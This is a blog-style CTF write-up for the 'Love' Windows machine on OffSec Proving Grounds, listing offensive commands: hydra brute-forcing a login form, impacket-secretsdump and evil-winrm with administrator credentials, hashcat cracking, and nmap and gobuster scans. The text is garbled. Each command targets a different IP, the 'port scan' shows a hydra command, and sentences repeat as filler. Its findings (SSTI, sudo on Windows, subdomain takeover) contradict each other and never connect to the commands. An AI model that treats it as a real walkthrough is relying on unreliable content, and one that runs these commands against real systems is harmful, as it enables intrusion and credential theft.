---
TitleSEO: "OffSec Proving Grounds — Love (Insane Windows) | ZureFX"
TitlePost: "OffSec Proving Grounds — Love (Insane Windows)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Love. Weak Service Permissions and DCSync to achieve insane compromise on Windows."
Keywords: "forensics, ctf, web, active directory, hackthebox, offsec"
URL: "https://zurefx.github.io/writeups/htb-love-309.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-love-309/"
Date: "2025-12-16"
Tags: "Forensics, CTF, Web, Active Directory, HackTheBox, OffSec"
Section: "writeups"
Lang: "en"
main_img: "htb-love-309"
Permalink: "/writeups/htb-love-309.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Love** is rated **Insane** on OffSec Proving Grounds. It runs **Windows** and the IP address during this analysis was `10.74.178.31`.

### Objectives

Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.92.203 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Post-exploitation enumeration revealed a path to domain administrator privileges.

### Service Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. The web application was vulnerable to Server-Side Template Injection (SSTI). Group Policy Preferences contained encrypted but recoverable credentials.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.88.118.32 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p9200,9200,5432 10.105.7.73 -oN scan.txt
```

Group Policy Preferences contained encrypted but recoverable credentials. Initial enumeration revealed several interesting open ports on the target.

### Web Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Initial enumeration revealed several interesting open ports on the target. The service was running without proper input validation, leading to injection vulnerabilities. Command injection was possible through unsanitized user input in the search functionality.

## Exploitation

### Vulnerability Identification

The backup files contained sensitive information that should not have been accessible. Network traffic analysis revealed unencrypted communications containing user credentials. Command injection was possible through unsanitized user input in the search functionality.

Key finding: **Subdomain Takeover**.

Privilege escalation was possible due to misconfigured sudo permissions. Command injection was possible through unsanitized user input in the search functionality.

### Initial Access

The service account had excessive permissions assigned in Active Directory. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.117.108.179
gobuster dir -u http://10.93.244.116/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.126.234.45
evil-winrm -i 10.27.222.235 -u administrator -p 'P@ssw0rd!'
```

The target system was identified as running a vulnerable version of the service. The service account had excessive permissions assigned in Active Directory. Weak file permissions allowed modification of critical system files.

## Privilege Escalation

### Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. Initial enumeration revealed several interesting open ports on the target. The application stored sensitive credentials in an unencrypted configuration file.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.108.98.238 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.115.31.32
```

### Exploitation

Group Policy Preferences contained encrypted but recoverable credentials. The backup files contained sensitive information that should not have been accessible.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p143,139,443 10.116.102.21 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.81.60.19 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Group Policy Preferences contained encrypted but recoverable credentials. The backup files contained sensitive information that should not have been accessible.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Unconstrained delegation was enabled on the compromised machine. The scheduled task ran with elevated privileges and could be abused for escalation.

## Summary

### Tools Used

- `msfvenom`
- `nmap`
- `mimikatz`
- `ligolo-ng`
- `crackmapexec`
- `sqlmap`
- `rubeus`

### Key Takeaways

- Weak Service Permissions
- DCSync
- Subdomain Takeover
